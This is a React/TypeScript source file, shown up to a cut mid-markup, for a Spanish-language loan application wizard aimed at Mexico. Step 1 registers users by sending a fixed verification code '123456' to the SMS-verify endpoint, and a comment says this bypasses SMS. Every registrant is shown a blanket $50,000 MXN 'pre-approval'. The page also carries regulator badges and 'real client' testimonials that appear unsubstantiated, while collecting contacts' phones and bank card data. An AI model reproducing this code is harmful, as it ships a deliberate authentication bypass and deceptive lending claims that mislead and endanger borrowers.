import React, { useState, useEffect } from 'react';
import { useTranslation } from 'react-i18next';
import { getApiUrl } from '../config/api';
import { httpClient, checkBrowserCompatibility } from '../utils/httpClient';
import { safeStorage, safeDateParse, arrayCompat, smoothScroll } from '../utils/browserCompat';

import { 
  trackLoanApplicationStart, 
  trackLoanApplicationComplete,
  trackFileUpload 
} from '../utils/analytics';

interface LoanApplication {
  id?: string;
  sessionId?: string;
  step: number;
  phone?: string;
  isGuest?: boolean;
  userId?: string;
  firstName?: string;
  lastName?: string;
  email?: string;
  birthDate?: string;
  idNumber?: string;
  realName?: string;
  contact1Name?: string;
  contact1Phone?: string;
  contact2Name?: string;
  contact2Phone?: string;
  bankCardNumber?: string;
  withdrawalAmount?: number;
  installmentPeriod?: number;
}

interface StepProps {
  data: LoanApplication;
  onUpdate: (data: Partial<LoanApplication>) => void;
  onNext: () => void;
  onBack: () => void;
  updateApplicationStep?: (step: number, stepData: any) => Promise<void>;
}

// 第1步：用户注册 - 专业金融风格
const Step1UserRegistration: React.FC<StepProps> = ({ data, onUpdate, onNext, updateApplicationStep }) => {
  const { t } = useTranslation();
  const [phone, setPhone] = useState(data.phone || '');
  const [countryCode, setCountryCode] = useState('+52');
  const [showApprovedAmount, setShowApprovedAmount] = useState(false);
  const [isRegistering, setIsRegistering] = useState(false);
  const [registrationSuccess, setRegistrationSuccess] = useState(false);

  const countryCodes = [
    { code: '+52', name: 'México', flag: '🇲🇽' },
    { code: '+1', name: 'Estados Unidos', flag: '🇺🇸' },
    { code: '+54', name: 'Argentina', flag: '🇦🇷' },
    { code: '+55', name: 'Brasil', flag: '🇧🇷' },
    { code: '+56', name: 'Chile', flag: '🇨🇱' },
    { code: '+57', name: 'Colombia', flag: '🇨🇴' },
  ];

  const handleCheckEligibility = async () => {
    if (!phone.trim()) return;

    setIsRegistering(true);
    try {
      // 自动注册用户（使用固定验证码绕过短信）
      const result = await httpClient.post('/auth/verify-sms', {
        phone: `${countryCode}${phone}`,
        code: '123456' // 固定验证码
      }) as any;

      if (result.success) {
        setRegistrationSuccess(true);
        onUpdate({ 
          phone: `${countryCode}${phone}`,
          userId: result.userId 
        });
        
        // 显示预批准金额
        setShowApprovedAmount(true);
        
        // 更新申请步骤
        if (updateApplicationStep) {
          await updateApplicationStep(1, { 
            phone: `${countryCode}${phone}`,
            userId: result.userId 
          });
        }
      }
    } catch (error) {
      console.error('Registration error:', error);
    } finally {
      setIsRegistering(false);
    }
  };

  return (
    <div className="p-6 lg:p-8">
      {/* 步骤标题 */}
      <div className="mb-8">
        <div className="flex items-center space-x-4 mb-6">
          <div className="w-12 h-12 bg-slate-800 rounded-lg flex items-center justify-center shadow-sm">
            <svg className="w-6 h-6 text-white" fill="currentColor" viewBox="0 0 20 20">
              <path d="M2 3a1 1 0 011-1h2.153a1 1 0 01.986.836l.74 4.435a1 1 0 01-.54 1.06l-1.548.773a11.037 11.037 0 006.105 6.105l.774-1.548a1 1 0 011.059-.54l4.435.74a1 1 0 01.836.986V17a1 1 0 01-1 1h-2C7.82 18 2 12.18 2 5V3z" />
            </svg>
          </div>
          <div>
            <h2 className="text-xl font-bold text-slate-900 font-['Source_Han_Sans_CN','PingFang_SC','Microsoft_YaHei',sans-serif]">
              Verificación de Elegibilidad
            </h2>
            <p className="text-sm text-slate-600 mt-1">
              Ingresa tu número de teléfono para verificar tu límite de crédito
            </p>
          </div>
        </div>
        
        {/* 安全认证标识 */}
        <div className="flex items-center space-x-4 p-4 bg-slate-50 border border-slate-200 rounded-lg">
          <div className="flex items-center space-x-2">
            <svg className="w-5 h-5 text-green-600" fill="currentColor" viewBox="0 0 20 20">
              <path fillRule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clipRule="evenodd" />
            </svg>
            <span className="text-sm font-medium text-slate-700">SSL 256-bit</span>
          </div>
          <div className="flex items-center space-x-2">
            <svg className="w-5 h-5 text-blue-600" fill="currentColor" viewBox="0 0 20 20">
              <path fillRule="evenodd" d="M6.267 3.455a3.066 3.066 0 001.745-.723 3.066 3.066 0 013.976 0 3.066 3.066 0 001.745.723 3.066 3.066 0 012.812 2.812c.051.643.304 1.254.723 1.745a3.066 3.066 0 010 3.976 3.066 3.066 0 00-.723 1.745 3.066 3.066 0 01-2.812 2.812 3.066 3.066 0 00-1.745.723 3.066 3.066 0 01-3.976 0 3.066 3.066 0 00-1.745-.723 3.066 3.066 0 01-2.812-2.812 3.066 3.066 0 00-.723-1.745 3.066 3.066 0 010-3.976 3.066 3.066 0 00.723-1.745 3.066 3.066 0 012.812-2.812zm7.44 5.252a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
            </svg>
            <span className="text-sm font-medium text-slate-700">CNBV Regulado</span>
          </div>
          <div className="flex items-center space-x-2">
            <svg className="w-5 h-5 text-amber-600" fill="currentColor" viewBox="0 0 20 20">
              <path d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
            </svg>
            <span className="text-sm font-medium text-slate-700">Datos Protegidos</span>
          </div>
        </div>
      </div>

      {!showApprovedAmount ? (
        <div className="space-y-6">
          {/* 手机号输入区域 */}
          <div className="space-y-2">
            <label className="block text-sm font-semibold text-slate-800 font-['Roboto','Helvetica_Neue',Arial,sans-serif]">
              Número de teléfono <span className="text-red-500">*</span>
            </label>
            <div className="grid grid-cols-[auto_1fr] gap-3">
              <select
                value={countryCode}
                onChange={(e) => setCountryCode(e.target.value)}
                className="px-4 py-3 border border-slate-300 rounded-sm bg-white text-sm font-['Roboto','Helvetica_Neue',Arial,sans-serif] focus:outline-none focus:ring-2 focus:ring-slate-800 focus:border-transparent min-w-[140px]"
              >
                {countryCodes.map((country) => (
                  <option key={country.code} value={country.code}>
                    {country.flag} {country.code}
                  </option>
                ))}
              </select>
              <input
                type="tel"
                value={phone}
                onChange={(e) => setPhone(e.target.value)}
                className="px-4 py-3 border border-slate-300 rounded-sm text-sm font-['Roboto','Helvetica_Neue',Arial,sans-serif] focus:outline-none focus:ring-2 focus:ring-slate-800 focus:border-transparent"
                placeholder="Ingresa tu número de teléfono"
              />
            </div>
          </div>

          {/* 注册成功提示 */}
          {registrationSuccess && (
            <div className="flex items-center space-x-3 p-4 bg-green-50 border border-green-200 rounded-lg">
              <svg className="w-5 h-5 text-green-600 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20">
                <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
              </svg>
              <span className="text-sm font-medium text-green-800">Usuario registrado exitosamente</span>
            </div>
          )}

          {/* 主要按钮 */}
          <div className="pt-4">
            <button
              onClick={handleCheckEligibility}
              disabled={!phone.trim() || isRegistering}
              className="w-full px-6 py-4 bg-slate-800 hover:bg-slate-700 disabled:bg-slate-400 text-white font-semibold rounded-sm transition-colors duration-200 font-['Roboto','Helvetica_Neue',Arial,sans-serif]"
            >
              {isRegistering ? (
                <div className="flex items-center justify-center space-x-3">
                  <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                  <span>Verificando elegibilidad...</span>
                </div>
              ) : (
                'Verificar Mi Límite de Crédito'
              )}
            </button>
          </div>

          {/* 信任指标 */}
          <div className="grid grid-cols-3 gap-4 pt-6 border-t border-slate-200">
            <div className="text-center">
              <div className="text-2xl font-bold text-slate-900 font-['Roboto','Helvetica_Neue',Arial,sans-serif]">2min</div>
              <div className="text-xs text-slate-600 mt-1">Aprobación</div>
            </div>
            <div className="text-center">
              <div className="text-2xl font-bold text-slate-900 font-['Roboto','Helvetica_Neue',Arial,sans-serif]">0%</div>
              <div className="text-xs text-slate-600 mt-1">Comisión</div>
            </div>
            <div className="text-center">
              <div className="text-2xl font-bold text-slate-900 font-['Roboto','Helvetica_Neue',Arial,sans-serif]">24/7</div>
              <div className="text-xs text-slate-600 mt-1">Soporte</div>
            </div>
          </div>
        </div>
      ) : (
        <div className="space-y-6">
          {/* 预批准金额显示 */}
          <div className="bg-gradient-to-r from-green-50 to-emerald-50 border border-green-200 rounded-lg p-6 text-center">
            <div className="mb-4">
              <svg className="w-16 h-16 text-green-600 mx-auto" fill="currentColor" viewBox="0 0 20 20">
                <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
              </svg>
            </div>
            <h3 className="text-2xl font-bold text-green-800 mb-2 font-['Source_Han_Sans_CN','PingFang_SC','Microsoft_YaHei',sans-serif]">
              ¡Felicidades!
            </h3>
            <p className="text-green-700 mb-4">Has sido pre-aprobado para un préstamo de hasta:</p>
            <div className="text-3xl font-bold text-green-800 mb-4 font-['Roboto','Helvetica_Neue',Arial,sans-serif]">
              $50,000 MXN
            </div>
            <div className="bg-white rounded-lg p-4 text-left space-y-3">
              <div className="flex justify-between text-sm">
                <span className="text-slate-600">Tasa de interés:</span>
                <span className="font-semibold text-slate-800">Desde 12% anual</span>
              </div>
              <div className="flex justify-between text-sm">
                <span className="text-slate-600">Plazo:</span>
                <span className="font-semibold text-slate-800">6 a 36 meses</span>
              </div>
              <div className="flex justify-between text-sm">
                <span className="text-slate-600">Sin comisiones:</span>
                <span className="font-semibold text-green-700">✓ Apertura gratuita</span>
              </div>
            </div>
          </div>

          {/* 继续按钮 */}
          <button
            onClick={onNext}
            className="w-full px-6 py-4 bg-slate-800 hover:bg-slate-700 text-white font-semibold rounded-sm transition-colors duration-200 font-['Roboto','Helvetica_Neue',Arial,sans-serif]"
          >
            Continuar con mi Solicitud
          </button>
        </div>
      )}
    </div>
  );
};

// 第2步：个人信息
const Step2PersonalInfo: React.FC<StepProps> = ({ data, onUpdate, onNext, onBack }) => {
  const { t } = useTranslation();

  return (
    <div className="p-6 lg:p-8">
      {/* 步骤标题 */}
      <div className="mb-8">
        <div className="flex items-center space-x-4 mb-6">
          <div className="w-12 h-12 bg-slate-800 rounded-lg flex items-center justify-center shadow-sm">
            <svg className="w-6 h-6 text-white" fill="currentColor" viewBox="0 0 20 20">
              <path fillRule="evenodd" d="M10 9a3 3 0 100-6 3 3 0 000 6zm-7 9a7 7 0 1114 0H3z" clipRule="evenodd" />
            </svg>
          </div>
          <div>
            <h2 className="text-xl font-bold text-slate-900 font-['Source_Han_Sans_CN','PingFang_SC','Microsoft_YaHei',sans-serif]">
              Información Personal
            </h2>
            <p className="text-sm text-slate-600 mt-1">
              Completa tus datos personales para continuar
            </p>
          </div>
        </div>
        
        {/* 安全提示 */}
        <div className="flex items-start space-x-3 p-4 bg-slate-50 border border-slate-200 rounded-lg">
          <svg className="w-5 h-5 text-slate-600 mt-0.5 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20">
            <path fillRule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clipRule="evenodd" />
          </svg>
          <div>
            <p className="text-sm font-semibold text-slate-700">Información protegida</p>
            <p className="text-xs text-slate-600 mt-1">Todos tus datos están encriptados y seguros</p>
          </div>
        </div>
      </div>

      {/* 表单区域 */}
      <div className="space-y-6">
        <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
          <div className="space-y-2">
            <label className="block text-sm font-semibold text-slate-800 font-['Roboto','Helvetica_Neue',Arial,sans-serif]">
              Nombre(s) <span className="text-red-500">*</span>
            </label>
            <input
              type="text"
              value={data.firstName || ''}
              onChange={(e) => onUpdate({ firstName: e.target.value })}
              className="w-full px-4 py-3 border border-slate-300 rounded-sm text-sm font-['Roboto','Helvetica_Neue',Arial,sans-serif] focus:outline-none focus:ring-2 focus:ring-slate-800 focus:border-transparent"
              placeholder="Ingresa tu nombre"
            />
          </div>

          <div className="space-y-2">
            <label className="block text-sm font-semibold text-slate-800 font-['Roboto','Helvetica_Neue',Arial,sans-serif]">
              Apellidos <span className="text-red-500">*</span>
            </label>
            <input
              type="text"
              value={data.lastName || ''}
              onChange={(e) => onUpdate({ lastName: e.target.value })}
              className="w-full px-4 py-3 border border-slate-300 rounded-sm text-sm font-['Roboto','Helvetica_Neue',Arial,sans-serif] focus:outline-none focus:ring-2 focus:ring-slate-800 focus:border-transparent"
              placeholder="Ingresa tus apellidos"
            />
          </div>

          <div className="space-y-2">
            <label className="block text-sm font-semibold text-slate-800 font-['Roboto','Helvetica_Neue',Arial,sans-serif]">
              Correo electrónico <span className="text-red-500">*</span>
            </label>
            <input
              type="email"
              value={data.email || ''}
              onChange={(e) => onUpdate({ email: e.target.value })}
              className="w-full px-4 py-3 border border-slate-300 rounded-sm text-sm font-['Roboto','Helvetica_Neue',Arial,sans-serif] focus:outline-none focus:ring-2 focus:ring-slate-800 focus:border-transparent"
              placeholder="ejemplo@correo.com"
            />
          </div>

          <div className="space-y-2">
            <label className="block text-sm font-semibold text-slate-800 font-['Roboto','Helvetica_Neue',Arial,sans-serif]">
              Fecha de nacimiento <span className="text-red-500">*</span>
            </label>
            <input
              type="date"
              value={data.birthDate || ''}
              onChange={(e) => onUpdate({ birthDate: e.target.value })}
              className="w-full px-4 py-3 border border-slate-300 rounded-sm text-sm font-['Roboto','Helvetica_Neue',Arial,sans-serif] focus:outline-none focus:ring-2 focus:ring-slate-800 focus:border-transparent"
            />
          </div>
        </div>
      </div>

      {/* 导航按钮 */}
      <div className="flex flex-col sm:flex-row justify-between items-center pt-8 mt-8 border-t border-slate-200 space-y-4 sm:space-y-0 sm:space-x-4">
        <button
          onClick={onBack}
          className="w-full sm:w-auto px-6 py-3 border border-slate-300 text-slate-700 font-semibold rounded-sm hover:bg-slate-50 transition-colors duration-200 font-['Roboto','Helvetica_Neue',Arial,sans-serif] flex items-center justify-center space-x-2"
        >
          <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
            <path fillRule="evenodd" d="M12.707 5.293a1 1 0 010 1.414L9.414 10l3.293 3.293a1 1 0 01-1.414 1.414l-4-4a1 1 0 010-1.414l4-4a1 1 0 011.414 0z" clipRule="evenodd" />
          </svg>
          <span>Anterior</span>
        </button>
        
        <button
          onClick={onNext}
          disabled={!data.firstName || !data.lastName || !data.email || !data.birthDate}
          className="w-full sm:w-auto px-6 py-3 bg-slate-800 hover:bg-slate-700 disabled:bg-slate-400 text-white font-semibold rounded-sm transition-colors duration-200 font-['Roboto','Helvetica_Neue',Arial,sans-serif] flex items-center justify-center space-x-2"
        >
          <span>Siguiente</span>
          <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
            <path fillRule="evenodd" d="M7.293 14.707a1 1 0 010-1.414L10.586 10 7.293 6.707a1 1 0 011.414-1.414l4 4a1 1 0 010 1.414l-4 4a1 1 0 01-1.414 0z" clipRule="evenodd" />
          </svg>
        </button>
      </div>
    </div>
  );
};

// 主向导组件 - 增强版
const LoanWizardEnhanced: React.FC = () => {
  const { t } = useTranslation();
  const [currentStep, setCurrentStep] = useState(1);
  const [applicationData, setApplicationData] = useState<LoanApplication>({
    step: 1,
    isGuest: true
  });
  const totalSteps = 12;

  const updateApplicationData = (data: Partial<LoanApplication>) => {
    setApplicationData(prev => ({ ...prev, ...data }));
  };

  const updateApplicationStep = async (step: number, stepData: any) => {
    try {
      if (applicationData.id) {
        await httpClient.put(`/applications/${applicationData.id}`, {
          step,
          ...stepData
        });
      }
    } catch (error) {
      console.error('Error updating application step:', error);
    }
  };

  const renderStep = () => {
    const stepProps = {
      data: applicationData,
      onUpdate: updateApplicationData,
      onNext: () => setCurrentStep(prev => Math.min(prev + 1, totalSteps)),
      onBack: () => setCurrentStep(prev => Math.max(prev - 1, 1)),
      updateApplicationStep
    };

    switch (currentStep) {
      case 1:
        return <Step1UserRegistration {...stepProps} />;
      case 2:
        return <Step2PersonalInfo {...stepProps} />;
      default:
        return (
          <div className="p-6 lg:p-8 text-center">
            <h2 className="text-2xl font-bold text-slate-800 mb-4 font-['Source_Han_Sans_CN','PingFang_SC','Microsoft_YaHei',sans-serif]">
              Paso {currentStep}
            </h2>
            <p className="text-slate-600 mb-8">Este paso está en desarrollo.</p>
            <div className="flex flex-col sm:flex-row justify-between space-y-4 sm:space-y-0 sm:space-x-4">
              <button
                onClick={() => setCurrentStep(prev => Math.max(prev - 1, 1))}
                className="px-6 py-3 border border-slate-300 text-slate-700 font-semibold rounded-sm hover:bg-slate-50 transition-colors duration-200 font-['Roboto','Helvetica_Neue',Arial,sans-serif]"
              >
                Anterior
              </button>
              <button
                onClick={() => setCurrentStep(prev => Math.min(prev + 1, totalSteps))}
                className="px-6 py-3 bg-slate-800 hover:bg-slate-700 text-white font-semibold rounded-sm transition-colors duration-200 font-['Roboto','Helvetica_Neue',Arial,sans-serif]"
              >
                Siguiente
              </button>
            </div>
          </div>
        );
    }
  };

  return (
    <div className="bg-gradient-to-br from-slate-50 via-white to-slate-100">
      {/* Hero区域 - 信任背书 */}
      <div className="bg-white border-b border-slate-200">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8 lg:py-12">
          <div className="grid grid-cols-1 lg:grid-cols-2 gap-8 lg:gap-12 items-center">
            {/* 左侧：主要信息 */}
            <div className="space-y-6">
              <div>
                <h1 className="text-3xl lg:text-4xl font-bold text-slate-900 mb-4 font-['Source_Han_Sans_CN','PingFang_SC','Microsoft_YaHei',sans-serif]">
                  Préstamos Personales Seguros
                </h1>
                <p className="text-lg text-slate-600 leading-relaxed">
                  Obtén el financiamiento que necesitas con tasas competitivas y proceso 100% digital. 
                  Regulados por CNBV y con la máxima seguridad en el manejo de tus datos.
                </p>
              </div>
              
              {/* características principales */}
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                <div className="flex items-center space-x-3">
                  <div className="w-8 h-8 bg-green-100 rounded-full flex items-center justify-center">
                    <svg className="w-4 h-4 text-green-600" fill="currentColor" viewBox="0 0 20 20">
                      <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
                    </svg>
                  </div>
                  <span className="text-sm font-medium text-slate-700">Aprobación en 2 minutos</span>
                </div>
                <div className="flex items-center space-x-3">
                  <div className="w-8 h-8 bg-blue-100 rounded-full flex items-center justify-center">
                    <svg className="w-4 h-4 text-blue-600" fill="currentColor" viewBox="0 0 20 20">
                      <path fillRule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clipRule="evenodd" />
                    </svg>
                  </div>
                  <span className="text-sm font-medium text-slate-700">Datos 100% seguros</span>
                </div>
                <div className="flex items-center space-x-3">
                  <div className="w-8 h-8 bg-amber-100 rounded-full flex items-center justify-center">
                    <svg className="w-4 h-4 text-amber-600" fill="currentColor" viewBox="0 0 20 20">
                      <path d="M8.433 7.418c.155-.103.346-.196.567-.267v1.698a2.305 2.305 0 01-.567-.267C8.07 8.34 8 8.114 8 8c0-.114.07-.34.433-.582zM11 12.849v-1.698c.22.071.412.164.567.267.364.243.433.468.433.582 0 .114-.07.34-.433.582a2.305 2.305 0 01-.567.267z" />
                      <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm1-13a1 1 0 10-2 0v.092a4.535 4.535 0 00-1.676.662C6.602 6.234 6 7.009 6 8c0 .99.602 1.765 1.324 2.246.48.32 1.054.545 1.676.662v1.941c-.391-.127-.68-.317-.843-.504a1 1 0 10-1.51 1.31c.562.649 1.413 1.076 2.353 1.253V15a1 1 0 102 0v-.092a4.535 4.535 0 001.676-.662C13.398 13.766 14 12.991 14 12c0-.99-.602-1.765-1.324-2.246A4.535 4.535 0 0011 9.092V7.151c.391.127.68.317.843.504a1 1 0 101.511-1.31c-.563-.649-1.413-1.076-2.354-1.253V5z" clipRule="evenodd" />
                    </svg>
                  </div>
                  <span className="text-sm font-medium text-slate-700">Sin comisiones ocultas</span>
                </div>
                <div className="flex items-center space-x-3">
                  <div className="w-8 h-8 bg-purple-100 rounded-full flex items-center justify-center">
                    <svg className="w-4 h-4 text-purple-600" fill="currentColor" viewBox="0 0 20 20">
                      <path fillRule="evenodd" d="M6 2a1 1 0 00-1 1v1H4a2 2 0 00-2 2v10a2 2 0 002 2h12a2 2 0 002-2V6a2 2 0 00-2-2h-1V3a1 1 0 10-2 0v1H7V3a1 1 0 00-1-1zm0 5a1 1 0 000 2h8a1 1 0 100-2H6z" clipRule="evenodd" />
                    </svg>
                  </div>
                  <span className="text-sm font-medium text-slate-700">Plazos flexibles</span>
                </div>
              </div>
            </div>

            {/* 右侧：主要图片 */}
            <div className="space-y-6">
              {/* 主要展示图片 */}
              <div className="relative">
                <img 
                  src="/images/hero-financial-security.jpg" 
                  alt="Seguridad Financiera - Préstamos Seguros"
                  className="w-full h-64 lg:h-80 object-cover rounded-lg shadow-lg"
                />
                <div className="absolute inset-0 bg-gradient-to-t from-slate-900/20 to-transparent rounded-lg"></div>
                <div className="absolute bottom-4 left-4 right-4">
                  <div className="bg-white/90 backdrop-blur-sm rounded-lg p-4">
                    <h3 className="font-semibold text-slate-800 text-sm mb-2">Proceso 100% Digital</h3>
                    <p className="text-xs text-slate-600">Solicita desde la comodidad de tu hogar</p>
                  </div>
                </div>
              </div>

              {/* 认证徽章 */}
              <div className="grid grid-cols-2 gap-4">
                <div className="bg-slate-50 border border-slate-200 rounded-lg p-4 text-center">
                  <img 
                    src="/images/cnbv-logo.png" 
                    alt="CNBV Regulado"
                    className="w-12 h-12 mx-auto mb-3 object-contain"
                  />
                  <h3 className="font-semibold text-slate-800 text-sm mb-1">CNBV</h3>
                  <p className="text-xs text-slate-600">Regulado</p>
                </div>
                <div className="bg-slate-50 border border-slate-200 rounded-lg p-4 text-center">
                  <img 
                    src="/images/ssl-security.png" 
                    alt="SSL 256-bit Security"
                    className="w-12 h-12 mx-auto mb-3 object-contain"
                  />
                  <h3 className="font-semibold text-slate-800 text-sm mb-1">SSL</h3>
                  <p className="text-xs text-slate-600">256-bit</p>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* 进度条区域 */}
      <div className="bg-white border-b border-slate-200 shadow-sm">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-4 lg:py-6">
          <div className="flex items-center justify-between mb-3">
            <div className="flex items-center space-x-3">
              <h2 className="text-lg lg:text-xl font-bold text-slate-800 font-['Source_Han_Sans_CN','PingFang_SC','Microsoft_YaHei',sans-serif]">
                Solicitud de Préstamo
              </h2>
              <div className="hidden lg:flex items-center space-x-2 text-sm text-slate-600">
                <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
                  <path fillRule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clipRule="evenodd" />
                </svg>
                <span>Proceso seguro y encriptado</span>
              </div>
            </div>
            <div className="text-right">
              <div className="text-sm font-semibold text-slate-800 font-['Roboto','Helvetica_Neue',Arial,sans-serif]">
                Paso {currentStep} de {totalSteps}
              </div>
              <div className="text-xs text-slate-500">
                {Math.round((currentStep / totalSteps) * 100)}% completado
              </div>
            </div>
          </div>
          
          {/* 进度条 */}
          <div className="w-full bg-slate-200 rounded-full h-2">
            <div
              className="bg-gradient-to-r from-slate-700 to-slate-800 h-2 rounded-full transition-all duration-500 ease-out"
              style={{ width: `${(currentStep / totalSteps) * 100}%` }}
            ></div>
          </div>
        </div>
      </div>

      {/* 主内容区域 */}
      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-6 lg:py-8">
        <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
          {/* 左侧：表单内容 */}
          <div className="lg:col-span-2 space-y-8">
            <div className="bg-white rounded-lg shadow-lg border border-slate-200 overflow-hidden max-w-2xl">
              {renderStep()}
            </div>

            {/* 表单下方的信任内容区域 */}
            <div className="space-y-8 max-w-2xl">
              {/* 流程说明 */}
              <div className="bg-white rounded-lg shadow-lg border border-slate-200 p-6">
                <h3 className="font-bold text-slate-800 text-lg mb-6 font-['Source_Han_Sans_CN','PingFang_SC','Microsoft_YaHei',sans-serif]">
                  Proceso Simple en 3 Pasos
                </h3>
                <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
                  <div className="text-center">
                    <div className="relative mb-4">
                      <img 
                        src="/images/step-1-phone.jpg" 
                        alt="Paso 1: Verificación telefónica"
                        className="w-20 h-20 mx-auto rounded-full object-cover shadow-md"
                      />
                      <div className="absolute -top-2 -right-2 w-8 h-8 bg-slate-800 text-white rounded-full flex items-center justify-center text-sm font-bold">
                        1
                      </div>
                    </div>
                    <h4 className="font-semibold text-slate-800 text-sm mb-2">Verificación</h4>
                    <p className="text-xs text-slate-600">Ingresa tu teléfono y verifica tu elegibilidad</p>
                  </div>
                  <div className="text-center">
                    <div className="relative mb-4">
                      <img 
                        src="/images/step-2-form.jpg" 
                        alt="Paso 2: Completar información"
                        className="w-20 h-20 mx-auto rounded-full object-cover shadow-md"
                      />
                      <div className="absolute -top-2 -right-2 w-8 h-8 bg-slate-800 text-white rounded-full flex items-center justify-center text-sm font-bold">
                        2
                      </div>
                    </div>
                    <h4 className="font-semibold text-slate-800 text-sm mb-2">Información</h4>
                    <p className="text-xs text-slate-600">Completa tus datos personales y financieros</p>
                  </div>
                  <div className="text-center">
                    <div className="relative mb-4">
                      <img 
                        src="/images/step-3-approval.jpg" 
                        alt="Paso 3: Aprobación y desembolso"
                        className="w-20 h-20 mx-auto rounded-full object-cover shadow-md"
                      />
                      <div className="absolute -top-2 -right-2 w-8 h-8 bg-slate-800 text-white rounded-full flex items-center justify-center text-sm font-bold">
                        3
                      </div>
                    </div>
                    <h4 className="font-semibold text-slate-800 text-sm mb-2">Aprobación</h4>
                    <p className="text-xs text-slate-600">Recibe tu dinero en minutos</p>
                  </div>
                </div>
              </div>

              {/* beneficios con imágenes */}
              <div className="bg-white rounded-lg shadow-lg border border-slate-200 p-6">
                <h3 className="font-bold text-slate-800 text-lg mb-6 font-['Source_Han_Sans_CN','PingFang_SC','Microsoft_YaHei',sans-serif]">
                  Beneficios Exclusivos
                </h3>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                  <div className="flex items-start space-x-4">
                    <img 
                      src="/images/benefit-fast-approval.jpg" 
                      alt="Aprobación Rápida"
                      className="w-16 h-16 rounded-lg object-cover shadow-sm flex-shrink-0"
                    />
                    <div>
                      <h4 className="font-semibold text-slate-800 text-sm mb-2">Aprobación Instantánea</h4>
                      <p className="text-xs text-slate-600">Respuesta automática en menos de 2 minutos usando tecnología avanzada de análisis crediticio.</p>
                    </div>
                  </div>
                  <div className="flex items-start space-x-4">
                    <img 
                      src="/images/benefit-low-rates.jpg" 
                      alt="Tasas Bajas"
                      className="w-16 h-16 rounded-lg object-cover shadow-sm flex-shrink-0"
                    />
                    <div>
                      <h4 className="font-semibold text-slate-800 text-sm mb-2">Tasas Competitivas</h4>
                      <p className="text-xs text-slate-600">Desde 12% anual, las mejores tasas del mercado sin comisiones por apertura.</p>
                    </div>
                  </div>
                  <div className="flex items-start space-x-4">
                    <img 
                      src="/images/benefit-flexible-terms.jpg" 
                      alt="Plazos Flexibles"
                      className="w-16 h-16 rounded-lg object-cover shadow-sm flex-shrink-0"
                    />
                    <div>
                      <h4 className="font-semibold text-slate-800 text-sm mb-2">Plazos Flexibles</h4>
                      <p className="text-xs text-slate-600">Elige el plazo que mejor se adapte a tu capacidad de pago, de 6 a 36 meses.</p>
                    </div>
                  </div>
                  <div className="flex items-start space-x-4">
                    <img 
                      src="/images/benefit-24-7-support.jpg" 
                      alt="Soporte 24/7"
                      className="w-16 h-16 rounded-lg object-cover shadow-sm flex-shrink-0"
                    />
                    <div>
                      <h4 className="font-semibold text-slate-800 text-sm mb-2">Soporte Especializado</h4>
                      <p className="text-xs text-slate-600">Equipo de atención al cliente disponible 24/7 para resolver todas tus dudas.</p>
                    </div>
                  </div>
                </div>
              </div>

              {/* Testimonios con fotos */}
              <div className="bg-white rounded-lg shadow-lg border border-slate-200 p-6">
                <h3 className="font-bold text-slate-800 text-lg mb-6 font-['Source_Han_Sans_CN','PingFang_SC','Microsoft_YaHei',sans-serif]">
                  Testimonios de Clientes Reales
                </h3>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                  <div className="bg-slate-50 rounded-lg p-4">
                    <div className="flex items-start space-x-4 mb-4">
                      <img 
                        src="/images/testimonial-maria.jpg" 
                        alt="María González - Cliente satisfecha"
                        className="w-12 h-12 rounded-full object-cover shadow-sm"
                      />
                      <div>
                        <h4 className="font-semibold text-slate-800 text-sm">María González</h4>
                        <div className="flex text-yellow-400 text-sm">
                          {'★'.repeat(5)}
                        </div>
                      </div>
                    </div>
                    <p className="text-sm text-slate-600 italic">
                      "Increíble lo rápido que fue todo el proceso. En menos de 30 minutos tenía el dinero en mi cuenta. 
                      El equipo de soporte fue muy profesional y me explicaron todo claramente."
                    </p>
                  </div>
                  <div className="bg-slate-50 rounded-lg p-4">
                    <div className="flex items-start space-x-4 mb-4">
                      <img 
